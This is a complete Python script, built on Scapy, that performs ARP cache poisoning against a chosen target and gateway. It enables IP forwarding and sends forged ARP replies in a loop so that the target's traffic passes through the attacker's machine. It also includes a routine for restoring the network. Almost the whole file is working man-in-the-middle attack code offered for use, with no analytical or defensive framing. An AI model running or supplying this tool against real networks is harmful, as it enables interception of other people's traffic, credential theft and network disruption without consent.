#!/usr/env/bin python
from scapy.all import *
import argparse
import os
import signal
import sys
import threading
import time


# ARP Poison parameters
def get_arg():
    parse = argparse.ArgumentParser()
    parse.add_argument("-i", "--interface", dest="iface", help="Specify the interface to be used.")
    parse.add_argument("-t", "--target", dest="target_ip", help="Specify the target ip to scan.")
    parse.add_argument("-g", "--gateway", dest="gateway_ip", help="Specify the ip of the gateway to scan.")
    arguments = parse.parse_args()
    return arguments


class ArpPoisoning:
    def __init__(self, interface, gateway_ip, target_ip):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.target_ip = target_ip
        self.gateway_mac = ArpPoisoning.get_mac(self.gateway_ip)
        self.target_mac = ArpPoisoning.get_mac(self.target_ip)

    @staticmethod
    # Get a MAC address using an IP.
    def get_mac(ip):
        # Create a packet with the net ip destination.
        arp_segment = ARP(pdst=ip)
        # Create a broadcast frame.
        ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff")
        # Assembly our frame.
        arp_probe = ether_frame/arp_segment
        # Send our probe and receive the answer.
        # Note: srp return 2 lists (answered and unanswered), only the answered is needed.
        probe_answered = srp(arp_probe, verbose=False, timeout=1, retry=5)[0]
        return probe_answered[0][1].hwsrc

    # Start the arp attack
    def start(self):
        # Start the script.
        print("[*] Starting Poisoning ...")
        print("[*] Enabling IP forwarding")
        # Enable IP Forwarding.
        os.system("sysctl -w net.ipv4.ip_forward=1")
        print(f"[*] Gateway IP address: {self.gateway_ip}")
        print(f"[*] Target IP address: {self.target_ip}")

        if self.gateway_mac is None:
            print("[!] Unable to get gateway MAC address. Exiting...")
            sys.exit(0)
        else:
            print(f"[*] Gateway MAC address: {self.gateway_mac}")

        if self.target_mac is None:
            print("[!] Unable to get target MAC address. Exiting...")
            sys.exit(0)
        else:
            print(f"[*] Target MAC address: {self.target_mac}")

        # Keep sending false ARP replies to put our machine in the middle to intercept packets.
        # This will use our interface MAC address as the hwsrc for the ARP reply.
        # ARP poison thread.
        poison_thread = threading.Thread(target=self.arp_poisoning)
        try:
            poison_thread.start()
            time.sleep(5)
        except (KeyboardInterrupt, SystemExit):
            print("[!] Stopped ARP poison attack. Restoring network")
            self.stop()

    # Create and send packets to poison de arp cache
    def arp_poisoning(self):
        print("[*] Started ARP poison attack [CTRL-C to stop]")
        while True:
            # The ARP function create the ARP packet, isn't needed to specify de hwsrc,
            # because the ARP function use the host iface MAC by default.
            send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip), verbose=False)
            send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip), verbose=False)
            print("[*] ARP poisoning undergoing ...")
            time.sleep(2)

    # Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with
    # correct MAC and IP Address information.
    def stop(self):
        print("[*] Stopping ARP poisoning... Restoring network")
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.gateway_ip, hwsrc=self.target_mac, psrc=self.target_ip),
             count=5, verbose=False)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.target_ip, hwsrc=self.gateway_mac, psrc=self.gateway_ip),
             count=5, verbose=False)
        print("[*] Disabling IP forwarding")
        # Disable IP Forwarding
        os.system("sysctl -w net.ipv4.ip_forward=0")
        # Kill the process
        os.kill(os.getpid(), signal.SIGTERM)
        sys.exit(0)


def main():
    options = get_arg()
    arp_attack = ArpPoisoning(options.iface, options.gateway_ip, options.target_ip)
    arp_attack.start()


if __name__ == '__main__':
    main()

